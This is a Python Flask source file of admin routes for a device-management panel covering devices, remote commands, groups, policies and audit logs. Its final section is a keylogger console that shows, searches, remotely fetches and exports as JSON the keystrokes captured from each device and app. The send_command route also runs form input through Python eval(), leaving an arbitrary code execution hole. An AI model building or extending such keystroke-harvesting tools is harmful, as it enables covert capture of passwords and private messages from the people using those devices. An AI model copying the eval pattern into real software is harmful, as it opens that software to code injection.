"""
Admin MDM management routes — Commands, Policies, Device Groups, Audit Logs.
"""

from flask import Blueprint, render_template, request, redirect, url_for, flash, jsonify
from admin.routes.auth import auth_required
from models.devices import Device, Command, DeviceGroup, Policy, AuditLog, Keystroke
from config.database import db
from datetime import datetime, timedelta
from sqlalchemy import desc, func
from logzero import logger
import os
import json
import requests as http_requests

mdm = Blueprint('mdm', __name__)

API_BASE = f"http://{os.getenv('API_HOST', '127.0.0.1')}:{os.getenv('API_PORT', '8000')}"


# ── Devices Overview ─────────────────────────────────────────────────────────

@mdm.route('/devices')
@auth_required
def devices_list():
    devices = Device.query.order_by(Device.last_seen.desc()).all()
    return render_template('pages/devices.html', devices=devices, now=datetime.now())


# ── Commands ─────────────────────────────────────────────────────────────────

@mdm.route('/commands')
@auth_required
def commands_list():
    """View all commands across all devices."""
    page = request.args.get('page', 1, type=int)
    status_filter = request.args.get('status', '')
    device_filter = request.args.get('device_id', '')

    query = Command.query
    if status_filter:
        query = query.filter_by(status=status_filter)
    if device_filter:
        query = query.filter_by(device_id=device_filter)

    commands = query.order_by(Command.created_at.desc()).limit(100).all()
    devices = Device.query.all()

    return render_template('pages/commands.html',
                           commands=commands, devices=devices,
                           status_filter=status_filter, device_filter=device_filter)


@mdm.route('/commands/send', methods=['POST'])
@auth_required
def send_command():
    """Send a command to a device via the API server."""
    device_id = request.form.get('device_id')
    command_type = request.form.get('command_type')
    payload = request.form.get('payload', '{}')

    try:
        resp = http_requests.post(f'{API_BASE}/commands/send', json={
            'device_id': device_id,
            'command_type': command_type,
            'payload': eval(payload) if payload.strip().startswith('{') else {},
        }, timeout=10)

        if resp.status_code == 201:
            flash({'status': 'success', 'message': f'{command_type} sent to device', 'title': 'Command Sent'})
        else:
            flash({'status': 'error', 'message': resp.json().get('error', 'Failed'), 'title': 'Error'})
    except Exception as e:
        flash({'status': 'error', 'message': str(e), 'title': 'Connection Error'})

    return redirect(url_for('mdm.commands_list'))


# ── Device Groups ────────────────────────────────────────────────────────────

@mdm.route('/groups')
@auth_required
def groups_list():
    groups = DeviceGroup.query.all()
    devices = Device.query.filter_by(group_id=None).all()  # unassigned devices
    return render_template('pages/groups.html', groups=groups, unassigned_devices=devices)


@mdm.route('/groups/create', methods=['POST'])
@auth_required
def create_group():
    name = request.form.get('name')
    description = request.form.get('description', '')

    if not name:
        flash({'status': 'warning', 'message': 'Group name is required', 'title': 'Missing Field'})
        return redirect(url_for('mdm.groups_list'))

    group = DeviceGroup(name=name, description=description)
    db.session.add(group)
    db.session.commit()
    flash({'status': 'success', 'message': f'Group "{name}" created', 'title': 'Success'})
    return redirect(url_for('mdm.groups_list'))


@mdm.route('/groups/<int:group_id>/assign', methods=['POST'])
@auth_required
def assign_device_to_group(group_id):
    device_id = request.form.get('device_id')
    device = Device.query.get(device_id)
    if device:
        device.group_id = group_id
        db.session.commit()
        flash({'status': 'success', 'message': 'Device assigned to group', 'title': 'Success'})
    return redirect(url_for('mdm.groups_list'))


@mdm.route('/groups/<int:group_id>/delete', methods=['POST'])
@auth_required
def delete_group(group_id):
    group = DeviceGroup.query.get_or_404(group_id)
    # Unassign devices first
    Device.query.filter_by(group_id=group_id).update({'group_id': None})
    db.session.delete(group)
    db.session.commit()
    flash({'status': 'success', 'message': f'Group "{group.name}" deleted', 'title': 'Deleted'})
    return redirect(url_for('mdm.groups_list'))


# ── Policies ─────────────────────────────────────────────────────────────────

@mdm.route('/policies')
@auth_required
def policies_list():
    policies = Policy.query.all()
    groups = DeviceGroup.query.all()
    return render_template('pages/policies.html', policies=policies, groups=groups)


@mdm.route('/policies/create', methods=['POST'])
@auth_required
def create_policy():
    name = request.form.get('name')
    description = request.form.get('description', '')
    group_id = request.form.get('group_id') or None
    rules_json = request.form.get('rules_json', '{}')

    policy = Policy(name=name, description=description, group_id=group_id, rules_json=rules_json)
    db.session.add(policy)
    db.session.commit()
    flash({'status': 'success', 'message': f'Policy "{name}" created', 'title': 'Success'})
    return redirect(url_for('mdm.policies_list'))


@mdm.route('/policies/<int:policy_id>/toggle', methods=['POST'])
@auth_required
def toggle_policy(policy_id):
    policy = Policy.query.get_or_404(policy_id)
    policy.is_active = not policy.is_active
    db.session.commit()
    status = 'activated' if policy.is_active else 'deactivated'
    flash({'status': 'success', 'message': f'Policy "{policy.name}" {status}', 'title': 'Updated'})
    return redirect(url_for('mdm.policies_list'))


@mdm.route('/policies/<int:policy_id>/delete', methods=['POST'])
@auth_required
def delete_policy(policy_id):
    policy = Policy.query.get_or_404(policy_id)
    db.session.delete(policy)
    db.session.commit()
    flash({'status': 'success', 'message': f'Policy deleted', 'title': 'Deleted'})
    return redirect(url_for('mdm.policies_list'))


# ── Audit Logs ───────────────────────────────────────────────────────────────

@mdm.route('/audit-logs')
@auth_required
def audit_logs():
    page = request.args.get('page', 1, type=int)
    logs = AuditLog.query.order_by(AuditLog.created_at.desc()).limit(200).all()
    return render_template('pages/audit_logs.html', logs=logs)


# ── Keylogger ───────────────────────────────────────────────────────────────

def format_keylogger_time(timestamp):
    now = datetime.now()
    today = now.date()
    if timestamp.date() == today:
        diff_seconds = (now - timestamp).total_seconds()
        if diff_seconds < 3600:
            return f"{int(diff_seconds / 60)} min"
        return timestamp.strftime("%I:%M%p").lower()
    elif timestamp.date() > (today - timedelta(days=7)):
        return timestamp.strftime("%a")
    else:
        return timestamp.strftime("%d %b")


@mdm.route('/keylogger')
@auth_required
def keylogger():
    """View keylogger data across all devices."""
    device_filter = request.args.get('device_id', '')
    app_filter = request.args.get('app', '')
    event_filter = request.args.get('event_type', '')
    search_query = request.args.get('q', '')

    query = Keystroke.query

    if device_filter:
        query = query.filter_by(device_id=device_filter)
    if app_filter:
        query = query.filter_by(package_name=app_filter)
    if event_filter:
        query = query.filter_by(event_type=event_filter)
    if search_query:
        query = query.filter(Keystroke.text.ilike(f'%{search_query}%'))

    keystrokes = query.order_by(desc(Keystroke.timestamp)).limit(500).all()

    # Stats
    total_count = Keystroke.query.count()
    today_count = Keystroke.query.filter(
        Keystroke.timestamp >= datetime.now().replace(hour=0, minute=0, second=0)
    ).count()
    device_count = db.session.query(func.count(func.distinct(Keystroke.device_id))).scalar()
    app_count = db.session.query(func.count(func.distinct(Keystroke.package_name))).scalar()

    # Get unique apps and devices for filters
    unique_apps = db.session.query(Keystroke.package_name).distinct().all()
    unique_apps = sorted([a[0] for a in unique_apps if a[0]])

    devices = Device.query.all()

    return render_template('pages/keylogger.html',
                           keystrokes=keystrokes,
                           devices=devices,
                           unique_apps=unique_apps,
                           device_filter=device_filter,
                           app_filter=app_filter,
                           event_filter=event_filter,
                           search_query=search_query,
                           total_count=total_count,
                           today_count=today_count,
                           device_count=device_count,
                           app_count=app_count,
                           format_keylogger_time=format_keylogger_time)


@mdm.route('/keylogger/fetch/<device_id>', methods=['POST'])
@auth_required
def fetch_keylogger(device_id):
    """Trigger keylogger data fetch from a device via API."""
    try:
        resp = http_requests.post(f'{API_BASE}/commands/send', json={
            'device_id': device_id,
            'command_type': 'GET_KEYLOGGER_DATA',
            'payload': {},
        }, timeout=10)

        if resp.status_code == 201:
            flash({'status': 'success', 'message': 'Keylogger fetch command sent', 'title': 'Success'})
        else:
            flash({'status': 'error', 'message': resp.json().get('error', 'Failed'), 'title': 'Error'})
    except Exception as e:
        flash({'status': 'error', 'message': str(e), 'title': 'Connection Error'})

    return redirect(url_for('mdm.keylogger'))


@mdm.route('/keylogger/export')
@auth_required
def export_keylogger():
    """Export keylogger data as JSON."""
    device_filter = request.args.get('device_id', '')
    query = Keystroke.query
    if device_filter:
        query = query.filter_by(device_id=device_filter)

    keystrokes = query.order_by(desc(Keystroke.timestamp)).limit(5000).all()
    data = []
    for k in keystrokes:
        data.append({
            'device_id': k.device_id,
            'package_name': k.package_name,
            'text': k.text,
            'event_type': k.event_type,
            'timestamp': k.timestamp.isoformat() if k.timestamp else None,
        })

    return jsonify(data)
